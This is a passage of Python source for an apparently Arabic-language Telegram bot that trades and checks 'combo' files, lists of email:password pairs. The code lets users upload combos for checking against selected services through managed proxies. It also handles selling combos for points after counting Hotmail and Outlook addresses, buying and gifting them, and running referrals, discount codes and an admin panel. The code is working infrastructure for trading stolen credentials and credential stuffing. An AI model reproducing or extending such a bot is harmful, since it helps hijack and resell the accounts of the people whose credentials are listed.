    bot.edit_message_text(get_text('sell_combo', user_id), user_id, call.message.message_id)
    bot.register_next_step_handler(call.message, process_sell_combo_file)

def process_sell_combo_file(message):
    user_id = message.chat.id
    if not message.document:
        bot.send_message(user_id, "❌ يرجى إرسال ملف txt صالح")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        response = requests.get(download_url)
        response.raise_for_status()
        file_content = response.content
        file_hash = hashlib.sha256(file_content).hexdigest()
        if file_hash in sold_hashes:
            bot.send_message(user_id, "❌ هذا الكومبو تم بيعه مسبقاً ولا يمكن بيعه مرة أخرى")
            return
        lines = response.text.splitlines()
        combo_lines = [line.strip() for line in lines if ':' in line]
        if len(combo_lines) < 100:
            bot.send_message(user_id, get_text('sell_fail', user_id).format(valid=0))
            return
        valid_count = 0
        test_limit = min(200, len(combo_lines))
        email_pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@(hotmail|outlook|live|msn)\.(com|co\.uk|net|org)$', re.IGNORECASE)
        for line in combo_lines[:test_limit]:
            try:
                email = line.split(':')[0]
                if email_pattern.match(email):
                    valid_count += 1
            except:
                continue
        if valid_count < 100:
            bot.send_message(user_id, get_text('sell_fail', user_id).format(valid=valid_count))
            return
        bot.send_message(user_id, get_text('sell_price', user_id))
        bot.register_next_step_handler(message, process_sell_combo_price, file_content, message.document.file_name, valid_count, file_hash)
    except Exception as e:
        bot.send_message(user_id, f"❌ خطأ: {e}")

def process_sell_combo_price(message, file_content, file_name, valid_count, file_hash):
    user_id = message.chat.id
    try:
        price = int(message.text.strip())
        if price < 10 or price > 100:
            bot.send_message(user_id, "❌ السعر يجب أن يكون بين 10 و 100 نقطة")
            return
        global bot_points
        with lock:
            if bot_points < price:
                bot.send_message(user_id, get_text('bot_points_low', user_id))
                return
            base_name = os.path.splitext(file_name)[0]
            new_file_name = f"{base_name}_{uuid.uuid4().hex[:4]}.txt"
            save_path = os.path.join(COMBOS_DIR, new_file_name)
            with open(save_path, 'wb') as f:
                f.write(file_content)
            sold_hashes.add(file_hash)
            save_sold_hashes()
            referral_points[user_id] = referral_points.get(user_id, 0) + price
            bot_points -= price
            save_data()
        bot.send_message(user_id, get_text('sell_success', user_id).format(name=new_file_name, price=price))
        bot.send_message(DEVELOPER_ID, f"💰 المستخدم {user_id} باع كومبو {new_file_name} مقابل {price} نقطة. عدد الحسابات الصالحة: {valid_count}")
    except ValueError:
        bot.send_message(user_id, "❌ يرجى إرسال رقم صحيح")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.chat.id != DEVELOPER_ID:
        bot.reply_to(message, "❌ Unauthorized")
        return
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    markup.add(telebot.types.InlineKeyboardButton("📊 Stats", callback_data="stats", style='primary'), telebot.types.InlineKeyboardButton("👥 Users", callback_data="users", style='primary'))
    markup.add(telebot.types.InlineKeyboardButton("🚫 Ban", callback_data="ban_user", style='danger'), telebot.types.InlineKeyboardButton("✅ Unban", callback_data="unban_user", style='success'))
    markup.add(telebot.types.InlineKeyboardButton("📁 Files", callback_data="files", style='primary'), telebot.types.InlineKeyboardButton("🔄 Refresh", callback_data="refresh", style='primary'))
    markup.add(telebot.types.InlineKeyboardButton("➕ إضافة كومبو", callback_data="add_combo", style='success'), telebot.types.InlineKeyboardButton("🗑 حذف كومبو", callback_data="delete_combo_menu", style='danger'))
    markup.add(telebot.types.InlineKeyboardButton("🎟️ إضافة كود خصم", callback_data="add_discount_code", style='primary'))
    markup.add(telebot.types.InlineKeyboardButton("🌐 Proxy Manager", callback_data="proxy_manager", style='primary'))
    markup.add(telebot.types.InlineKeyboardButton("💰 شحن نقاط البوت", callback_data="add_bot_points", style='primary'))
    bot.send_message(DEVELOPER_ID, "🔧 Developer Control Panel", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ['stats', 'users', 'ban_user', 'unban_user', 'files', 'refresh', 'add_combo', 'delete_combo_menu', 'add_discount_code', 'proxy_manager', 'add_bot_points'])
def dev_buttons(call):
    if call.from_user.id != DEVELOPER_ID:
        try:
            bot.answer_callback_query(call.id, "❌ Only for developer")
        except ApiTelegramException:
            pass
        return
    if call.data == 'stats':
        total_users = len(set(selected_options.keys()) | set(user_language.keys()))
        stats = f"""
📊 *Bot Statistics*
👥 Total users: {total_users}
🚫 Banned: {len(blocked_users)}
✅ Valid: {check_results.get(DEVELOPER_ID, {}).get('good', 0)}
❌ Invalid: {check_results.get(DEVELOPER_ID, {}).get('bad', 0)}
💰 Bot points: {bot_points}
"""
        try:
            bot.edit_message_text(stats, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        except ApiTelegramException:
            pass
    elif call.data == 'users':
        users_list = list(user_language.keys())
        text = f"👥 *Users:* {len(users_list)}\n" + "\n".join(f"• {uid}" for uid in users_list[:20])
        try:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        except ApiTelegramException:
            pass
    elif call.data == 'ban_user':
        msg = bot.send_message(DEVELOPER_ID, "Send user ID to ban:")
        bot.register_next_step_handler(msg, ban_user_step)
    elif call.data == 'unban_user':
        msg = bot.send_message(DEVELOPER_ID, "Send user ID to unban:")
        bot.register_next_step_handler(msg, unban_user_step)
    elif call.data == 'files':
        if not os.path.exists("Accounts"):
            try:
                bot.edit_message_text("📁 No Accounts folder yet", call.message.chat.id, call.message.message_id)
            except ApiTelegramException:
                pass
        else:
            files_list = os.listdir("Accounts")
            if not files_list:
                try:
                    bot.edit_message_text("📁 No files yet", call.message.chat.id, call.message.message_id)
                except ApiTelegramException:
                    pass
            else:
                text = "📁 *Saved files:*\n" + "\n".join(f"• {f}" for f in files_list[:30])
                try:
                    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
                except ApiTelegramException:
                    pass
    elif call.data == 'refresh':
        try:
            bot.edit_message_text("🔄 Refreshed", call.message.chat.id, call.message.message_id)
        except ApiTelegramException:
            pass
    elif call.data == 'add_combo':
        msg = bot.send_message(DEVELOPER_ID, "📤 أرسل ملف الكومبو (txt) لإضافته إلى المكتبة:")
        bot.register_next_step_handler(msg, add_combo_step)
    elif call.data == 'delete_combo_menu':
        combos = get_combo_list()
        if not combos:
            bot.send_message(DEVELOPER_ID, get_text('no_combos', DEVELOPER_ID))
            return
        bot.edit_message_text(get_text('delete_combo', DEVELOPER_ID), call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=create_delete_combo_buttons(DEVELOPER_ID))
    elif call.data == 'add_discount_code':
        msg = bot.send_message(DEVELOPER_ID, "أرسل كود الخصم والنسبة المئوية (مثال: SAVE50 50):")
        bot.register_next_step_handler(msg, add_discount_code_step)
    elif call.data == 'proxy_manager':
        markup = telebot.types.InlineKeyboardMarkup(row_width=3)
        markup.add(telebot.types.InlineKeyboardButton("➕ إضافة بروكسي", callback_data="add_proxy", style='success'))
        markup.add(telebot.types.InlineKeyboardButton("🗑 حذف بروكسي", callback_data="del_proxy", style='danger'))
        markup.add(telebot.types.InlineKeyboardButton("📋 عرض البروكسيات", callback_data="list_proxies", style='primary'))
        bot.edit_message_text("🌐 إدارة البروكسيات", call.message.chat.id, call.message.message_id, reply_markup=markup)
    elif call.data == 'add_bot_points':
        msg = bot.send_message(DEVELOPER_ID, "💰 أدخل عدد النقاط لإضافتها إلى رصيد البوت:")
        bot.register_next_step_handler(msg, add_bot_points_step)

def add_bot_points_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    try:
        points = int(message.text.strip())
        global bot_points
        with lock:
            bot_points += points
            save_data()
        bot.reply_to(message, f"✅ تمت إضافة {points} نقطة إلى رصيد البوت. الرصيد الحالي: {bot_points}")
    except:
        bot.reply_to(message, "❌ خطأ: أدخل رقماً صحيحاً")

@bot.callback_query_handler(func=lambda call: call.data in ['add_proxy', 'del_proxy', 'list_proxies'])
def proxy_actions(call):
    if call.from_user.id != DEVELOPER_ID:
        bot.answer_callback_query(call.id, "❌ Only for developer")
        return
    if call.data == 'add_proxy':
        msg = bot.send_message(DEVELOPER_ID, "أرسل البروكسي بالصيغة ip:port أو ip:port:user:pass")
        bot.register_next_step_handler(msg, add_proxy_step)
    elif call.data == 'del_proxy':
        if not proxies_list:
            bot.send_message(DEVELOPER_ID, "لا توجد بروكسيات للحذف")
            return
        markup = telebot.types.InlineKeyboardMarkup(row_width=3)
        for idx, proxy in enumerate(proxies_list):
            markup.add(telebot.types.InlineKeyboardButton(f"🗑 {proxy}", callback_data=f"del_proxy_{idx}", style='danger'))
        bot.edit_message_text("اختر بروكسي لحذفه:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    elif call.data == 'list_proxies':
        if not proxies_list:
            text = "📋 لا توجد بروكسيات"
        else:
            text = "📋 قائمة البروكسيات:\n" + "\n".join(f"{i+1}. {p}" for i, p in enumerate(proxies_list))
        bot.send_message(DEVELOPER_ID, text)

def add_proxy_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    proxy = message.text.strip()
    proxies_list.append(proxy)
    save_data()
    bot.reply_to(message, f"✅ تم إضافة البروكسي: {proxy}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('del_proxy_'))
def delete_proxy_callback(call):
    if call.from_user.id != DEVELOPER_ID:
        bot.answer_callback_query(call.id, "❌ Only for developer")
        return
    idx = int(call.data.split('_')[2])
    if 0 <= idx < len(proxies_list):
        removed = proxies_list.pop(idx)
        save_data()
        bot.answer_callback_query(call.id, f"✅ تم حذف {removed}")
        admin_panel(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ غير موجود")

def add_discount_code_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    try:
        code, percent = message.text.split()
        percent = int(percent)
        discount_codes[code] = {"percent": percent, "uses_left": 5}
        save_data()
        bot.reply_to(message, f"✅ تم إضافة كود {code} بنسبة خصم {percent}% (5 استخدامات)")
    except:
        bot.reply_to(message, "❌ خطأ: أرسل الكود والنسبة مفصولين بمسافة")

def add_combo_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    if not message.document:
        bot.reply_to(message, "❌ يرجى إرسال ملف txt صالح")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        file_path = file_info.file_path
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        response = requests.get(download_url)
        response.raise_for_status()
        file_name = message.document.file_name
        if not file_name.endswith('.txt'):
            file_name += '.txt'
        save_path = os.path.join(COMBOS_DIR, file_name)
        with open(save_path, 'wb') as f:
            f.write(response.content)
        bot.reply_to(message, get_text('combo_added', DEVELOPER_ID).format(name=file_name))
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_combo_'))
def delete_combo_callback(call):
    if call.from_user.id != DEVELOPER_ID:
        bot.answer_callback_query(call.id, "❌ Only for developer")
        return
    combo_name = call.data.replace('delete_combo_', '')
    file_path = os.path.join(COMBOS_DIR, combo_name)
    if os.path.exists(file_path):
        os.remove(file_path)
        bot.answer_callback_query(call.id, get_text('combo_deleted', DEVELOPER_ID).format(name=combo_name), show_alert=True)
        admin_panel(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ File not found", show_alert=True)

def ban_user_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    try:
        uid = int(message.text.strip())
        blocked_users.add(uid)
        save_data()
        bot.reply_to(message, f"✅ Banned user {uid}")
    except:
        bot.reply_to(message, "❌ Invalid ID")

def unban_user_step(message):
    if message.chat.id != DEVELOPER_ID:
        return
    try:
        uid = int(message.text.strip())
        blocked_users.discard(uid)
        save_data()
        bot.reply_to(message, f"✅ Unbanned user {uid}")
    except:
        bot.reply_to(message, "❌ Invalid ID")

@bot.message_handler(commands=['start'])
def start(message):
    try:
        user_id = message.chat.id
        if user_id == DEVELOPER_ID:
            user_language[user_id] = 'ar'
            save_data()
        if user_id not in user_language and user_id not in blocked_users and str(user_id) not in temp_banned_until:
            user_info = f"""
👤 *مستخدم جديد دخل البوت*
🆔 ID: `{user_id}`
📛 Name: {message.from_user.first_name or ''} {message.from_user.last_name or ''}
🖥️ Username: @{message.from_user.username or 'None'}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            try:
                bot.send_message(DEVELOPER_ID, user_info, parse_mode="Markdown")
            except Exception as e:
                print(f"فشل إرسال إشعار للمطور: {e}")
        if len(message.text.split()) > 1:
            ref_code = message.text.split()[1]
            if ref_code in referral_codes and referral_codes[ref_code] != user_id:
                is_new_user = True
                if str(user_id) in referral_points:
                    is_new_user = False
                elif any(user_id == v for v in referral_codes.values()):
                    is_new_user = False
                elif user_id in user_language:
                    is_new_user = False
                elif user_id in blocked_users:
                    is_new_user = False
                if is_new_user:
                    referrer = referral_codes[ref_code]
                    with lock:
                        if referrer not in referral_points:
                            referral_points[referrer] = 0
                        referral_points[referrer] += 10
                        if user_id not in referral_points:
                            referral_points[user_id] = 0
                        referral_points[user_id] += 5
                        save_data()
                    bot.send_message(user_id, "🎁 تم تفعيل الإحالة! حصلت على 5 نقاط، والمُحيل حصل على 10 نقاط")
                    bot.send_message(referrer, f"🎁 المستخدم {user_id} اشترك عبر رابطك! حصلت على 10 نقاط إضافية.")
                    new_level = update_user_level(referrer)
                    if new_level > 1:
                        bot.send_message(referrer, get_text('level_up', referrer).format(level=new_level))
                else:
                    bot.send_message(user_id, "⚠️ أنت مستخدم قديم، لن تحصل على نقاط إحالة إضافية.")
        if user_id in blocked_users:
            bot.send_message(user_id, get_text('blocked', user_id))
            return
        if str(user_id) in temp_banned_until:
            until = datetime.fromtimestamp(temp_banned_until[str(user_id)])
            if until > datetime.now():
                bot.send_message(user_id, get_text('temp_banned', user_id))
                return
            else:
                del temp_banned_until[str(user_id)]
                save_data()
        if not is_subscribed(user_id):
            markup = telebot.types.InlineKeyboardMarkup()
            btn_sub = telebot.types.InlineKeyboardButton("📢 اشترك في القناة", url=f"https://t.me/{FORCED_CHANNEL[1:]}")
            btn_check = telebot.types.InlineKeyboardButton("✅ تأكد", callback_data="check_sub", style='primary')
            markup.add(btn_sub, btn_check)
            bot.send_message(user_id, get_text('not_subscribed', user_id), reply_markup=markup)
            return
        if user_id not in user_language:
            markup = create_language_buttons()
            bot.send_message(user_id, "🌐 اختر لغتك / Choose your language:", reply_markup=markup)
            return
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        btn_channel = telebot.types.InlineKeyboardButton('𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🎁', callback_data='login', style='primary')
        btn_combo = telebot.types.InlineKeyboardButton('📁 كومبو بنك', callback_data='combo_bank', style='primary')
        btn_referral = telebot.types.InlineKeyboardButton('🎁 إحالة', callback_data='referral_info', style='primary')
        btn_points = telebot.types.InlineKeyboardButton('💰 نقاطي', callback_data='show_points', style='primary')
        btn_daily = telebot.types.InlineKeyboardButton('🎁 مكافأة يومية', callback_data='daily_bonus', style='primary')
        btn_most_sold = telebot.types.InlineKeyboardButton('🏆 الأكثر مبيعاً', callback_data='most_sold', style='primary')
        btn_sell = telebot.types.InlineKeyboardButton('💰 بيع كومبو', callback_data='sell_combo', style='primary')
        markup.add(btn_channel, btn_combo, btn_referral, btn_points, btn_daily, btn_most_sold, btn_sell)
        bot.send_message(user_id, get_text('welcome', user_id), reply_markup=markup)
    except Exception as e:
        print(f"خطأ في دالة start: {e}")
        import traceback
        traceback.print_exc()
        bot.send_message(message.chat.id, "⚠️ حدث خطأ داخلي. تم إبلاغ المطور.")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    global is_checking_global, check_queue, pending_combo_data
    try:
        bot.reply_to(message, "✅ تم استلام الملف، جاري المعالجة...")
        user_id = message.chat.id
        if user_id in blocked_users:
            bot.send_message(user_id, get_text('blocked', user_id))
            return
        if str(user_id) in temp_banned_until:
            until = datetime.fromtimestamp(temp_banned_until[str(user_id)])
            if until <= datetime.now():
                del temp_banned_until[str(user_id)]
                save_data()
            else:
                bot.reply_to(message, get_text('temp_banned', user_id))
                return
        if not is_subscribed(user_id):
            markup = telebot.types.InlineKeyboardMarkup()
            btn_sub = telebot.types.InlineKeyboardButton("📢 اشترك في القناة", url=f"https://t.me/{FORCED_CHANNEL[1:]}")
            btn_check = telebot.types.InlineKeyboardButton("✅ تأكد", callback_data="check_sub", style='primary')
            markup.add(btn_sub, btn_check)
            bot.send_message(user_id, get_text('not_subscribed', user_id), reply_markup=markup)
            return
        if user_id not in user_language:
            bot.send_message(user_id, "⚠️ يرجى استخدام /start أولاً لاختيار اللغة")
            return
        os.makedirs("Accounts", exist_ok=True)
        os.makedirs(COMBOS_DIR, exist_ok=True)
        MAX_FILE_SIZE = 20 * 1024 * 1024
        if message.document.file_size > MAX_FILE_SIZE:
            bot.reply_to(message, "⚠️ الملف كبير جداً (الحد الأقصى 20 ميجابايت)")
            return
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        if is_checking_global:
            pending_combo_data[user_id] = {
                'content': downloaded_file,
                'file_name': message.document.file_name
            }
            check_queue.append(user_id)
            bot.send_message(user_id, "⏳ البوت مشغول بفحص حالياً. تم وضعك في قائمة الانتظار. سيبدأ فحصك تلقائياً بعد انتهاء الفحص الحالي.")
            return
        else:
            start_check_for_user(user_id, downloaded_file)
    except requests.exceptions.RequestException as e:
        print(f"Download error: {e}")
        bot.send_message(message.chat.id, "⚠️ فشل تحميل الملف من الخادم. حاول مجدداً.")
    except UnicodeDecodeError as e:
        print(f"Decode error: {e}")
        bot.send_message(message.chat.id, "⚠️ ترميز الملف غير مدعوم. احفظ الملف كـ UTF-8 أو ANSI وأعد المحاولة.")
    except Exception as e:
        print(f"Unexpected error in handle_document: {e}")
        bot.send_message(message.chat.id, "⚠️ حدث خطأ أثناء معالجة الملف. تأكد من صيغة الملف (email:password في كل سطر) وحاول مجدداً.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('option_'))
def option_callback(call):
    chat_id = call.message.chat.id
    service_name = call.data[7:]
    if chat_id not in selected_options:
        selected_options[chat_id] = []
    if service_name in selected_options[chat_id]:
        selected_options[chat_id].remove(service_name)
    else:
        selected_options[chat_id].append(service_name)
    try:
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
    except ApiTelegramException:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'select_all')
def select_all_callback(call):
    chat_id = call.message.chat.id
    try:
        selected_options[chat_id] = list(services.keys())
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
        bot.answer_callback_query(call.id, "✅ تم اختيار جميع الخدمات" if user_language.get(chat_id, 'ar') == 'ar' else "✅ All services selected")
    except ApiTelegramException:
        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية هذه الرسالة، يرجى إرسال الملف مرة أخرى.", show_alert=True)
    except Exception as e:
        bot.answer_callback_query(call.id, f"⚠️ حدث خطأ تقني: {str(e)}", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'deselect_all')
def deselect_all_callback(call):
    chat_id = call.message.chat.id
    try:
        selected_options[chat_id] = []
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
        bot.answer_callback_query(call.id, "❌ تم إلغاء جميع الخدمات" if user_language.get(chat_id, 'ar') == 'ar' else "❌ All services deselected")
    except ApiTelegramException:
        bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية هذه الرسالة، يرجى إرسال الملف مرة أخرى.", show_alert=True)
    except Exception as e:
        bot.answer_callback_query(call.id, f"⚠️ حدث خطأ تقني: {str(e)}", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_check_callback(call):
    chat_id = call.message.chat.id
    stop_check_flag[chat_id] = True
    pause_check_flag[chat_id] = False
    bot.answer_callback_query(call.id, get_text('stop_check', chat_id), show_alert=True)
    try:
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=None)
    except ApiTelegramException:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_check_callback(call):
    chat_id = call.message.chat.id
    try:
        if not combo_list:
            bot.answer_callback_query(call.id, "⚠️ يرجى إرسال ملف كومبو أولاً (txt يحتوي على email:password).", show_alert=True)
            return
        if chat_id in blocked_users:
            bot.answer_callback_query(call.id, get_text('blocked', chat_id), show_alert=True)
            return
        if not selected_options.get(chat_id):
            bot.answer_callback_query(call.id, get_text('no_service', chat_id), show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, get_text('start_check', chat_id))
        with lock:
            check_results[chat_id] = {'good': 0, 'bad': 0, 'message_id': None, 'service_hits': {}, 'rewards_count': 0, 'countries_set': set(), 'twofa_count': 0}
        status_message = update_status_message(chat_id, add_stop_button=True, control_buttons=True)
        if status_message:
            check_results[chat_id]['message_id'] = status_message.message_id
        else:
            check_results[chat_id]['message_id'] = None
        with combo_lock:
            local_combo = combo_list.copy()
        start_checking(chat_id, local_combo)
    except ApiTelegramException as e:
        print(f"Telegram API error in start_check: {e}")
        bot.send_message(chat_id, "⚠️ حدث خطأ في الاتصال، حاول مرة أخرى.")
    except Exception as e:
        print(f"Unexpected error in start_check: {e}")
        bot.send_message(chat_id, "⚠️ حدث خطأ غير متوقع. أعد المحاولة لاحقاً.")

@bot.callback_query_handler(func=lambda call: call.data == 'lang_ar')
def lang_ar_callback(call):
    user_id = call.message.chat.id
    user_language[user_id] = 'ar'
    save_data()
    try:
        bot.edit_message_text("✅ تم حفظ اللغة العربية", call.message.chat.id, call.message.message_id)
    except ApiTelegramException:
        pass
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data == 'lang_en')
def lang_en_callback(call):
    user_id = call.message.chat.id
    user_language[user_id] = 'en'
    save_data()
    try:
        bot.edit_message_text("✅ English language saved", call.message.chat.id, call.message.message_id)
    except ApiTelegramException:
        pass
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data == 'check_sub')
def check_sub_callback(call):
    user_id = call.message.chat.id
    if is_subscribed(user_id):
        with lock:
            if user_id not in referral_points:
                referral_points[user_id] = 0
            referral_points[user_id] += 10
            save_data()
        bot.edit_message_text(get_text('subscribed', user_id), user_id, call.message.message_id)
        start(call.message)
    else:
        bot.answer_callback_query(call.id, get_text('not_subscribed', user_id), show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'referral_info')
def referral_info_callback(call):
    bot.answer_callback_query(call.id)
    user_id = call.message.chat.id
    if user_id not in referral_codes:
        code = str(uuid.uuid4())[:8]
        referral_codes[code] = user_id
        save_data()
    else:
        code = [k for k, v in referral_codes.items() if v == user_id][0]
    bot_username = "JF_7F135BOT"
    link = f"https://t.me/{bot_username}?start={code}"
    points = referral_points.get(user_id, 0)
    try:
        text = get_text('referral_info', user_id).format(link=link, points=points)
        bot.send_message(user_id, text, parse_mode="Markdown", disable_web_page_preview=True)
    except Exception:
        bot.send_message(user_id, f"🎁 رابط الإحالة الخاص بك:\n{link}\nنقاطك: {points}")

@bot.callback_query_handler(func=lambda call: call.data == 'show_points')
def show_points_callback(call):
    user_id = call.message.chat.id
    points = referral_points.get(user_id, 0)
    level = update_user_level(user_id)
    text = get_text('points', user_id).format(points=points, level=level)
    bot.answer_callback_query(call.id, text, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'daily_bonus')
def daily_bonus_callback(call):
    user_id = call.message.chat.id
    last_bonus = user_daily_bonus.get(str(user_id), 0)
    if datetime.now().timestamp() - last_bonus < 86400:
        bot.answer_callback_query(call.id, get_text('daily_bonus_already', user_id), show_alert=True)
        return
    user_daily_bonus[str(user_id)] = datetime.now().timestamp()
    with lock:
        if user_id not in referral_points:
            referral_points[user_id] = 0
        referral_points[user_id] += 2
        save_data()
    points = referral_points[user_id]
    bot.answer_callback_query(call.id, get_text('daily_bonus', user_id).format(points=points), show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'most_sold')
def most_sold_callback(call):
    user_id = call.message.chat.id
    if not combo_sales_count:
        bot.answer_callback_query(call.id, "لا توجد مبيعات كافية بعد", show_alert=True)
        return
    sorted_combos = sorted(combo_sales_count.items(), key=lambda x: x[1], reverse=True)[:5]
    list_text = ""
    for idx, (name, count) in enumerate(sorted_combos, 1):
        list_text += f"{idx}. {name} - {count} مبيعات\n"
    text = get_text('most_sold', user_id).format(list=list_text)
    bot.edit_message_text(text, user_id, call.message.message_id, parse_mode="Markdown", reply_markup=create_most_sold_buttons(user_id))

@bot.callback_query_handler(func=lambda call: call.data == 'combo_bank')
def combo_bank_callback(call):
    user_id = call.message.chat.id
    combos = get_combo_list()
    if not combos:
        bot.answer_callback_query(call.id, get_text('no_combos', user_id), show_alert=True)
        return
    points = referral_points.get(user_id, 0)
    text = get_text('combo_bank', user_id).format(points=points)
    bot.edit_message_text(text, user_id, call.message.message_id, parse_mode="Markdown")
    bot.edit_message_reply_markup(user_id, call.message.message_id, reply_markup=create_combo_bank_buttons(user_id))

@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_combo_'))
def buy_combo_callback(call):
    user_id = call.message.chat.id
    combo_name = call.data[10:]
    file_path = os.path.join(COMBOS_DIR, combo_name)
    if not os.path.exists(file_path):
        bot.answer_callback_query(call.id, "❌ File not found", show_alert=True)
        return
    price = get_combo_price(user_id)
    points = referral_points.get(user_id, 0)
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    confirm_text = "✅ شراء" if user_language.get(user_id, 'ar') == 'ar' else "✅ Buy"
    gift_text = "🎁 إهداء" if user_language.get(user_id, 'ar') == 'ar' else "🎁 Gift"
    cancel_text = "❌ إلغاء" if user_language.get(user_id, 'ar') == 'ar' else "❌ Cancel"
    discount_text = "🎟️ كود خصم" if user_language.get(user_id, 'ar') == 'ar' else "🎟️ Discount Code"
    markup.add(telebot.types.InlineKeyboardButton(confirm_text, callback_data=f"confirm_buy|{combo_name}|{price}", style='success'))
    markup.add(telebot.types.InlineKeyboardButton(gift_text, callback_data=f"gift_combo|{combo_name}|{price}", style='primary'))
    markup.add(telebot.types.InlineKeyboardButton(discount_text, callback_data=f"discount_code|{combo_name}|{price}", style='primary'))
    markup.add(telebot.types.InlineKeyboardButton(cancel_text, callback_data="cancel_buy", style='danger'))
    bot.edit_message_text(get_text('buy_prompt', user_id).format(name=combo_name, price=price, points=points), user_id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_buy|'))
def confirm_buy_callback(call):
    user_id = call.message.chat.id
    parts = call.data.split('|')
    combo_name = parts[1]
    price = int(parts[2])
    file_path = os.path.join(COMBOS_DIR, combo_name)
    if not os.path.exists(file_path):
        bot.answer_callback_query(call.id, "❌ File not found", show_alert=True)
        return
    with lock:
        points = referral_points.get(user_id, 0)
        if points >= price:
            referral_points[user_id] = points - price
            global bot_points
            bot_points += price
            combo_sales_count[combo_name] = combo_sales_count.get(combo_name, 0) + 1
            user_purchase_count[str(user_id)] = user_purchase_count.get(str(user_id), 0) + 1
            if str(user_id) not in user_purchase_weekly:
                user_purchase_weekly[str(user_id)] = datetime.now().timestamp()
            save_data()
        else:
            bot.edit_message_text(get_text('buy_fail_points', user_id).format(points=points, price=price), user_id, call.message.message_id)
            return
    with open(file_path, 'rb') as f:
        bot.send_document(user_id, f, caption=f"📁 {combo_name}\n💰 تم شراؤه بـ {price} نقطة. نقاطك المتبقية: {referral_points[user_id]}")
    bot.edit_message_text(get_text('buy_success', user_id).format(price=price, points=referral_points[user_id]), user_id, call.message.message_id)
    bot.send_message(DEVELOPER_ID, f"📢 المستخدم {user_id} اشترى كومبو {combo_name} مقابل {price} نقطة. رصيده الآن {referral_points[user_id]}")
    new_level = update_user_level(user_id)
    if new_level > 1:
        bot.send_message(user_id, get_text('level_up', user_id).format(level=new_level))

@bot.callback_query_handler(func=lambda call: call.data.startswith('gift_combo|'))
def gift_combo_callback(call):
    user_id = call.message.chat.id
    parts = call.data.split('|')
    combo_name = parts[1]
    price = int(parts[2])
    user_gifts[str(user_id)] = {'combo': combo_name, 'price': price}
    bot.edit_message_text(get_text('gift_prompt', user_id), user_id, call.message.message_id)
    bot.register_next_step_handler(call.message, process_gift, combo_name, price)

def process_gift(message, combo_name, price):
    user_id = message.chat.id
    try:
        target_id = int(message.text.strip())
    except:
        bot.send_message(user_id, get_text('gift_fail', user_id))
        return
    if target_id == user_id:
        bot.send_message(user_id, "لا يمكنك إهداء نفسك")
        return
    with lock:
        points = referral_points.get(user_id, 0)
        if points < price:
            bot.send_message(user_id, get_text('buy_fail_points', user_id).format(points=points, price=price))
            return
        file_path = os.path.join(COMBOS_DIR, combo_name)
        if not os.path.exists(file_path):
            bot.send_message(user_id, "❌ الملف غير موجود")
            return
        referral_points[user_id] = points - price
        if target_id not in referral_points:
            referral_points[target_id] = 0
        save_data()
    with open(file_path, 'rb') as f:
        bot.send_document(target_id, f, caption=f"🎁 لقد تلقيت هدية: {combo_name}\nمن المستخدم {user_id}")
    bot.send_message(user_id, get_text('gift_success', user_id).format(name=combo_name, target=target_id))
    bot.send_message(DEVELOPER_ID, f"🎁 المستخدم {user_id} أهدى كومبو {combo_name} إلى {target_id}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('discount_code|'))
def discount_code_prompt(call):
    user_id = call.message.chat.id
    parts = call.data.split('|')
    combo_name = parts[1]
    price = int(parts[2])
    user_gifts[str(user_id)] = {'combo': combo_name, 'price': price, 'discount_mode': True}
    bot.edit_message_text(get_text('discount_code', user_id), user_id, call.message.message_id)
